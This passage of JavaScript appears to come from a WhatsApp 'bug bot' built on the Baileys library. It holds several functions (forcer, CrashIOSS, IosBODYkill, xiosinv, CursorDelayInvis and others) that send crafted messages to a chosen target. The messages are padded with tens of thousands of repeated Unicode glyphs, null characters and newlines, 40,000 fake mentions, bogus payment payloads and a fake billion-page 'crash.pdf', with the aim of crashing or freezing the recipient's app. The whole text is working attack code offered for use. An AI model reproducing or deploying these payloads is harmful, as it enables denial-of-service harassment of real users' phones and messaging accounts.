                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐑𝐞𝐥𝐥𝐲𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}

async function forcer(isTarget){
	const rajaXeon = {
  key: {
    remoteJid: '120363422217202244@g.us',
    fromMe: true,
    id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
    participant: '201286008203@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: 'Telegram: @lo_tus_19',
  broadcast: false,
  status: 2,
  message: {
    conversation: 'Telegram: @lo_tus_19',
    messageContextInfo: {
      messageSecret: new Uint8Array([
        123, 153, 59, 66, 69, 1, 31, 219,
        233, 201, 204, 107, 149, 77, 233, 100,
        80, 15, 30, 192, 133, 13, 171, 48,
        44, 27, 61, 135, 73, 149, 172, 105
      ])
    }
  },
  id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
  isBaileys: false,
  chat: '120363422217202244@g.us',
  fromMe: true,
  isGroup: true,
  sender: '201286008203@s.whatsapp.net',
  participant: '201286008203@s.whatsapp.net',
  mtype: 'conversation',
  msg: 'Telegram: @lo_tus_19',
  body: 'Telegram: @lo_tus_19',
  quoted: null,
  mentionedJid: [],
  text: 'Telegram: @lo_tus_19',
  reply: function() {}, // Placeholder for function
  copy: function() {}, // Placeholder for function
  copyNForward: function() {} // Placeholder for function
};
	await XeonBotInc.relayMessage(
    isTarget,
    {
      locationMessage: {
        degreesLatitude: 'Telegram: @lo_tus_19',
        degreesLongitude: 'Telegram: @lo_tus_19',
        name: `Telegram: @lo_tus_19`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: sender,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug
          },
          externalAdReply: {
            title: ' Telegram: @lo_tus_19 ',
            body: 'Telegram: @lo_tus_19',
            mediaType: 0,
            thumbnail: rajaXeon,
            jpegThumbnail: rajaXeon,
            mediaUrl: `https://www.youtube.com/@ `,
            sourceUrl: `https://www.youtube.com/@ `
          }
        }
      }
    },
    {
      participant: {
        jid: isTarget
      }
    },
    {
      messageId: null
    }
);
	
	}

async function forcergp(isTarget){
	const rajaXeon = {
  key: {
    remoteJid: '120363422217202244@g.us',
    fromMe: true,
    id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
    participant: '201286008203@s.whatsapp.net'
  },
  messageTimestamp: 1753786706,
  pushName: 'Telegram: @lo_tus_19',
  broadcast: false,
  status: 2,
  message: {
    conversation: 'Telegram: @lo_tus_19',
    messageContextInfo: {
      messageSecret: new Uint8Array([
        123, 153, 59, 66, 69, 1, 31, 219,
        233, 201, 204, 107, 149, 77, 233, 100,
        80, 15, 30, 192, 133, 13, 171, 48,
        44, 27, 61, 135, 73, 149, 172, 105
      ])
    }
  },
  id: '1BCED5F78D153A18F0AC68B38DAB8D9A',
  isBaileys: false,
  chat: '120363422217202244@g.us',
  fromMe: true,
  isGroup: true,
  sender: '201286008203@s.whatsapp.net',
  participant: '201286008203@s.whatsapp.net',
  mtype: 'conversation',
  msg: 'Telegram: @lo_tus_19',
  body: 'Telegram: @lo_tus_19',
  quoted: null,
  mentionedJid: [],
  text: 'Telegram: @lo_tus_19',
  reply: function() {}, // Placeholder for function
  copy: function() {}, // Placeholder for function
  copyNForward: function() {} // Placeholder for function
};
	await XeonBotInc.relayMessage(
    isTarget,
    {
      locationMessage: {
        degreesLatitude: 'Telegram: @lo_tus_19',
        degreesLongitude: 'Telegram: @lo_tus_19',
        name: `Telegram: @lo_tus_19`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: sender,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug
          },
          externalAdReply: {
            title: ' Telegram: @lo_tus_19 ',
            body: 'Telegram: @lo_tus_19',
            mediaType: 0,
            thumbnail: rajaXeon,
            jpegThumbnail: rajaXeon,
            mediaUrl: `https://www.youtube.com/@ `,
            sourceUrl: `https://www.youtube.com/@ `
          }
        }
      }
    },
    {
      messageId: null
    }
);
	
	}
//==============================================================\\
async function Toyainvisios(target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "Telegram: @lo_tus_19\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/VIP_1XB",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: null,
            jpegThumbnail: null,
            caption: "@lo_tus_19" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
//😏. 
}
//==============================================================\\
async function CrashIOSS(client, target) {
  const msg = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "&",
      url: "",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "",
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: ""
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

    await XeonBotInc.relayMessage(target, { groupStatusMessageV2: { message: msg } }, {
      participant: { jid: target }
    });
        console.log("send bug ios");
}
//==============================================================\\
async function IosBODYkill(target)  {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "" + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "" + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://vip.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "",
            matchedText: "",
            description: "𑇂𑆵𑆴𑆿".repeat(15000),
            title: "" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await XeonBotInc.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await XeonBotInc.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};
//==============================================================\\
async function xiosinv(target){
tmsg = await generateWAMessageFromContent(target, {
               viewOnceMessage: {
                   message: {
                       listResponseMessage: {
                           title: '@lo_tus_19\n',
                           description:"\n\n\n"+"𑪆".repeat(260000),
                           singleSelectReply: {
                               selectedId: "id"
                           },
                           listType: 1
                       }
                   }
               }
       }, {});

       await XeonBotInc.relayMessage("status@broadcast", tmsg.message, {
           messageId: tmsg.key.id,
           statusJidList: [target],
           additionalNodes: [{
               tag: "meta",
               attrs: {},
               content: [{
                   tag: "mentioned_users",
                   attrs: {},
                   content: [{
                       tag: "to",
                       attrs: { jid: target },
                       content: undefined,
                   }],
               }],
           }],
       });
       }
//==============================================================\\

async function forcedelokq(isTarget) {
  const msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𝐗͢͠𝐚𝐯͜𝐞͡𝐫𝐢͜𝐮͡𝐬 ⍣᳟ 𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙𝐨༑⃟⃟🎭',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                    fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                    scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                    scanLengths: [ 5657, 38661, 12072, 27792 ],
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𝐗͢͠𝐚𝐯͜𝐞͡𝐫𝐢͜𝐮͡𝐬 ⍣᳟ 𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙𝐨༑⃟⃟🎭"
                },
                footer: {
                  text: "Carosuel.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Xrl ~ Fuckerr",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐑𝐞𝐥𝐥𝐲𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}
async function CursorDelayInvis(target) {
const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '⛧ 尺izxᐯelz 𐍈fficial-Iᗪ ⛧',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                    fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                    scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                    scanLengths: [ 5657, 38661, 12072, 27792 ],
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "⛧ RizxVelz - Official ⛧"
                },
                footer: {
                  text: "xeon.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "⛧ 尺izxᐯelz 𐍈fficial-Iᗪ ⛧",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]